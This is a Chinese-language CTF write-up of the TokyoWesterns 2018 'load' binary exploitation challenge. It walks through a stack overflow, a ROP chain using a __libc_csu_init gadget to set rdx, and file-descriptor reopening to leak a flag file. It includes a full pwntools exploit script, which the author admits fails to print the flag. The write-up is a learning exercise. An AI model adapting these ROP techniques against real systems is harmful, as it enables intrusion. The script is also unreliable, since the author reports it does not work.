# 考察点

- [linux open函数返回值的规律](https://blog.csdn.net/csdn66_2016/article/details/77716008)
- rop
- fix no` pop rdx` gadget -> `__libc_csu_init ` [参考贴文](https://hackmd.io/@u1f383/pwn-cheatsheet)

# 分析
```shell
➜  ROP file ./TokyoWestern18_pwn_load/load                         
./TokyoWestern18_pwn_load/load: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=a0620e5b122fd043e5a40e181f3f3adf29e6f4c1, stripped
➜  ROP checksec ./TokyoWestern18_pwn_load/load 
[!] Could not populate PLT: invalid syntax (unicorn.py, line 110)
[*] '/home/pitta/workspace/pwn_learn/rec0rd/ROP/TokyoWestern18_pwn_load/load'
    Arch:       amd64-64-little
    RELRO:      Full RELRO          # ASLR
    Stack:      No canary found
    NX:         NX enabled          # 栈不可执行
    PIE:        No PIE (0x400000)

➜  TokyoWestern18_pwn_load ./load 
Load file Service
Input file name: flag.txt i guess?
Input offset: 100
Input size: 200
You can't read this file...
```

IDA
```c
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  char v4[32]; // [rsp+0h] [rbp-30h] BYREF
  __int64 fsize; // [rsp+20h] [rbp-10h]
  __int64 foffset; // [rsp+28h] [rbp-8h]

  sub_4008A9();
  _printf_chk(1LL, "Load file Service\nInput file name: ");
  getInput(targetFIlename, 128);                // getInput as the name of target file
  _printf_chk(1LL, "Input offset: ");
  foffset = (int)getInt();
  _printf_chk(1LL, "Input size: ");
  fsize = (int)getInt();
  readTargetFIle(v4, targetFIlename, foffset, fsize);// read target file store in v4， maybe overflow vuln
  sub_4008D8();
  return 0LL;
}
```
targetFIlename 存在于 .bss 段，说明 writeable
```shell
.bss:0000000000601040     ; char targetFIlename[128]
.bss:0000000000601040     targetFIlename  db 80h dup(?)           ; DATA XREF: main+26↑o
.bss:0000000000601040                                             ; main+7A↑o
.bss:0000000000601040     _bss            ends
```

了解完大致的功能，再进行尝试
```shell
➜  TokyoWestern18_pwn_load ./load 
Load file Service
Input file name: /etc/apt/sources.list
Input offset: 1
Input size: 100
Load file complete!
[1]    41583 segmentation fault  ./load     # segmentation fault

gdb-peda$ r
Starting program: /home/pitta/workspace/pwn_learn/rec0rd/ROP/TokyoWestern18_pwn_load/load 
Load file Service
Input file name: /proc/self/fd/0
Input offset: 0
Input size: 64
AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAH
Load file complete!
```


```shell
Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
RAX: 0x0 
RBX: 0x0 
RCX: 0x7ffff7b049f0 (<close+16>:        cmp    rax,0xfffffffffffff001)
RDX: 0x7ffff7dd3780 --> 0x0 
RSI: 0x7ffff7dd26a3 --> 0xdd3780000000000a 
RDI: 0x2 
RBP: 0x4147414131414162 ('bAA1AAGA')
RSP: 0x7fffffffdf18 ("AcAA2AAH\001")
RIP: 0x4008a8 (ret)
R8 : 0x7ffff7fdb700 (0x00007ffff7fdb700)
R9 : 0x1999999999999999 
R10: 0x0 
R11: 0x246 
R12: 0x400720 (xor    ebp,ebp)
R13: 0x7fffffffdff0 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x10217 (CARRY PARITY ADJUST zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x40089d:    call   0x4008d8
   0x4008a2:    mov    eax,0x0
   0x4008a7:    leave  
=> 0x4008a8:    ret    
   0x4008a9:    push   rbp
   0x4008aa:    mov    rbp,rsp
   0x4008ad:    mov    rax,QWORD PTR [rip+0x20077c]        # 0x601030 <stdin>
   0x4008b4:    mov    esi,0x0
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffdf18 ("AcAA2AAH\001")           # ret here
0008| 0x7fffffffdf20 --> 0x1 
0016| 0x7fffffffdf28 --> 0x7fffffffdff8 --> 0x7fffffffe2a2 ("/home/pitta/workspace/pwn_learn/rec0rd/ROP/TokyoWestern18_pwn_load/load")
0024| 0x7fffffffdf30 --> 0x1f7ffcca0 
0032| 0x7fffffffdf38 --> 0x400816 (push   rbp)
0040| 0x7fffffffdf40 --> 0x0 
0048| 0x7fffffffdf48 --> 0xffe90395daba4795 
0056| 0x7fffffffdf50 --> 0x400720 (xor    ebp,ebp)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x00000000004008a8 in ?? ()
```
```shell
gdb-peda$ pattern offset "AcAA2AAH"    
AcAA2AAH found at offset: 56    # 需要 padding 56 单位内容覆盖到返回地址
```
明确 ret 的 padding 之后，开始构造 ROP chain，最终实现的目标时把 flag.txt 读取出来，可以利用文件符 `/proc/self/fd/1` 进行回显。
由于可覆盖的变量属于 main 领空，覆盖的返回地址时main 的，再次之前，相应的 文件描述符都被关闭了，
```c
int sub_4008D8()
{
  close(0);
  close(1);
  return close(2);
}
```
因此需要重新调用 open 把管道打开，并且可预测后续 open 函数的返回 fd 描述符的，因为是需要从最小开始使用，并且按照顺序分配（详细参考开头相关的外链文章）。

文件管道预备知识：
```
Thing is, the file /proc/self/fd/1 which is used by the program to access STDOUT, is just a symlink(符号链接) to /dev/pts/2 (keep note, the person who made the writeup which this is based on, the exact file it used changed to values such as 0-3. I found success with 2 on my local system).

So we can open that file with the open command, so it would be open("/dev/pts/2") twice, to open STDOUT followed by open("/home/load/flag.txt") to open the flag file (the names would be stored in the bss along with the input file and separated with a null byte, so we know the address of where they are stored in memory). File descriptors are issued by the lowest file descriptor available. 
Since STDIN, STDOUT, and STDERR have all been closed, that means that the 0, 1, and 2 file decriptors are now free, and will be our next three file descriptors we issue (in an ascending order | 按序分配). Thing is we need /dev/pts/2 to have the file descriptor 1 (by opening it twice|第一次分配到0，绑定 STDIN,第二次分配1，绑定 STDOUT), which is associated with STDOUT. That way when we read the contents of the flag file to it (which from there we will call the puts command, which writes to the file descriptor 0) it will otput to the right file. Proceeding that we can just call read(3, (bss address of "flag.txt" string), 100) where 3 is the file descriptor for STDOUT.
```

在笔者的机器上，查看 /proc/self/fd/1 的符号链接情况：
```shell
➜  TokyoWestern18_pwn_load ls -l /proc/self/fd/1
lrwx------ 1 pitta pitta 64 Aug 25 23:55 /proc/self/fd/1 -> /dev/pts/14
➜  TokyoWestern18_pwn_load ls -l /proc/self/fd/0
lrwx------ 1 pitta pitta 64 Aug 25 23:57 /proc/self/fd/0 -> /dev/pts/14
➜  TokyoWestern18_pwn_load ls -l /proc/self/fd/2
lrwx------ 1 pitta pitta 64 Aug 25 23:57 /proc/self/fd/2 -> /dev/pts/14
```

因为目标程序 close 了 0、1、2 管道，因此在 open 按照顺序对三个fd 进行分配。
- open("/dev/pts/14", 0x2702, 0x0), 需要两次，第一次是  fd=0, 第二次 fd=1(STDOUT，为了后续回显 flag 需要)，因为需要有写入权限，因此需要设置 open function 对应的[文件描述符 flag](https://blog.csdn.net/d704791892/article/details/132158393) [0x2702 = S_ISGID:0x2000 OR S_IRWXU:0x700 OR S_IWOTH:0x2]
- open(flag,0x0,0x0)  第三次调用 open 分配的 fd=2
- read(2, 0x601000, 1000)    把 flag 的内容，读取到程序的 可写区域  
- 调用 puts@plt(0x601000) 就可以使用之前已经 reopen 的 STDOUT（fd =2） 进行回显内容了

涉及到的文件描述符号：/proc/self/fd/0 , /dev/pts/14, flag(方便复现，笔者将 flag.txt 放在题目同目录)
rop 需要用到上述三个内容，因此可以第一次提供 filename 提供 /proc/self/fd/0 将三个字段传进入，存在因为写入存放 filename 的位置是 .bss
```shell
.bss:0000000000601040     targetFIlename  db 80h dup(?)           ; DATA XREF: main+26↑o
.bss:0000000000601040                                             ; main+7A↑o
.bss:0000000000601040     _bss            ends
```


pop_rdi_ret = 0x400a73
pop_rsi_r15_ret = 0x400a71
没有 pop rdx? -> 找 `__libc_csu_init`，因为末尾有相关的,利用其他寄存器去配合 mov指令去污染 rdx
```shell
...
.text:0000000000400A50 038                 mov     rdx, r13         #step2 tain rdx with r13 we already control
.text:0000000000400A53 038                 mov     rsi, r14
.text:0000000000400A56 038                 mov     edi, r15d
.text:0000000000400A59 038                 call    qword ptr [r12+rbx*8]
.text:0000000000400A5D 038                 add     rbx, 1
.text:0000000000400A61 038                 cmp     rbx, rbp
.text:0000000000400A64 038                 jnz     short loc_400A50
.text:0000000000400A66
.text:0000000000400A66     loc_400A66:                             ; CODE XREF: init+34↑j
.text:0000000000400A66 038                 add     rsp, 8
.text:0000000000400A6A 030                 pop     rbx
.text:0000000000400A6B 028                 pop     rbp
.text:0000000000400A6C 020                 pop     r12
.text:0000000000400A6E 018                 pop     r13      # step 1 , set r13, wait ret to step2
.text:0000000000400A70 010                 pop     r14
.text:0000000000400A72 008                 pop     r15
.text:0000000000400A74 000                 retn
```

# exp

```python
# -*- coding: UTF-8 -*-

from pwn import *

pipe = process("./load")

STDin = "/proc/self/fd/0"
STDout = "/dev/pts/14"
flagFile = "/home/pitta/workspace/pwn_learn/rec0rd/ROP/TokyoWestern18_pwn_load/flag.txt"

open_plt = 0x400710
puts_plt = 0x4006C0
read_plt = 0x4006E8

bss_filename = 0x601040

pop_rdi_ret = 0x400a73
pop_rsi_r15_ret = 0x400a71

data_addr = 0x601000

def rdi(arg):
    return p64(pop_rdi_ret) + p64(arg)

def rsi(arg):
    return p64(pop_rsi_r15_ret) + p64(arg) + p64(0)

# 利用 __libc_csu_init 制造 rdx 操作空间是，需要设置 ebx = 0， rbp = 1
def rdx(arg):
     segment = p64(0x400A6B)
     segment += p64(1)                  # for rbp
     segment += p64(0xdeadbeef)         # for r12
     segment += p64(arg)                # set r13
     segment += p64(0xdeadbeef) * 2     # for r14,15
     segment += p64(0x400A46)           # back to xor ebp, ebp, mock rdx = r13 at 0x400A50
     segment += "0"*8*7                 # for new round of 6 registers and ·add rsp,8· at 0x400A66
     return segment

# make rop chain
chain = "A" * 56    # padding

# open("/dev/pts/14", 0x2702, 0x0)  -> fd 0
chain += rdi(bss_filename + len(STDin +"\x00"))     # locate /dev/pts/14
chain += rsi(0x2702)
chain += rdx(0)
chain += p64(open_plt)

# open("/dev/pts/14", 0x2702, 0x0)  -> fd 1
chain += rdi(bss_filename + len(STDin +"\x00"))
chain += rsi(0x2702)
chain += rdx(0)
chain += p64(open_plt)

# open(flag,0x0,0x0)    fd 2
chain += rdi(bss_filename + len(STDin + "\x00" + STDout + "\x00"))  # locate flag_path
chain += rsi(0x0)
chain += rdx(0x0)
chain += p64(open_plt)

# read(2,data_addr,1000)
chain += rdi(2)
chain += rsi(data_addr)
chain += rdx(1000)
chain += p64(read_plt)

# puts(data_addr)
chain += rdi(data_addr)
chain += p64(puts_plt)


# context.log_level = "debug"
print(pipe.recvuntil("name: "))
pipe.sendline(STDin + "\x00" + STDout + "\x00" + flagFile + "\x00")

print(pipe.recvuntil("Input offset: "))
pipe.sendline("0")

print(pipe.recvuntil("Input size: "))
pipe.sendline(str(len(chain)))

pipe.sendline(chain)

# context.terminal = ["tmux", "splitw", "-h"]
# gdb .attach(pipe)
print(pipe.interactive())

```

感觉 exp 没啥问题，就是给不到 puts 的 flag.txt 的回显内容。不过也学到了挺多东西，不才，留坑。。
